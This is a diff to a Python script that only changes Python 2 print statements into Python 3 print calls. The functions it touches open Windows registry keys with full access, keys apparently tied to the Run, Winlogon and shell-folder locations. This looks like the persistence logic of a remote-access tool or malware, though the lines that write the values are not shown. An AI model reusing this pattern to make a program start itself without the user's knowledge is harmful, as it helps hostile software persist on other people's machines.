@@ -8,7 +8,7 @@ HLM_USF = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folder
 
 def addRegistery(new_file_path):
     try:
-        print '[*] Adding keys to the registry'
+        print ('[*] Adding keys to the registry')
         addkey_HCU_RUN = OpenKey(HKEY_CURRENT_USER, HCU_RUN, 0, KEY_ALL_ACCESS)
         addkey_HLM_WL = OpenKey(HKEY_CURRENT_USER, HLM_WL, 0, KEY_ALL_ACCESS)
         addkey_HLM_SF = OpenKey(HKEY_CURRENT_USER, HLM_SF, 0, KEY_ALL_ACCESS)
@@ -23,14 +23,14 @@ def addRegistery(new_file_path):
         CloseKey(addkey_HLM_WL)
         CloseKey(addkey_HLM_SF)
         CloseKey(addkey_HLM_USF)
-        print '[*] Keys Added'
+        print ('[*] Keys Added')
     except Exception as e:
-        print '==> Error in add_to_registry function'
-        print e
+        print ('==> Error in add_to_registry function')
+        print (e)
     
 def deleteRegistery():    
     try:
-        print '[*] Removed keys to the registry'
+        print ('[*] Removed keys to the registry')
         addkey_HCU_RUN = OpenKey(HKEY_CURRENT_USER, HCU_RUN, 0, KEY_ALL_ACCESS)
         addkey_HLM_WL = OpenKey(HKEY_CURRENT_USER, HLM_WL, 0, KEY_ALL_ACCESS)
         addkey_HLM_SF = OpenKey(HKEY_CURRENT_USER, HLM_SF, 0, KEY_ALL_ACCESS)
@@ -45,7 +45,7 @@ def deleteRegistery():
         CloseKey(addkey_HLM_WL)
         CloseKey(addkey_HLM_SF)
         CloseKey(addkey_HLM_USF)
-        print '[*] Keys removed'
-        print '==> Error in add_to_registry function'
+        print ('[*] Keys removed')
+        print ('==> Error in add_to_registry function')
     except Exception as e:
-        print e
+        print (e)
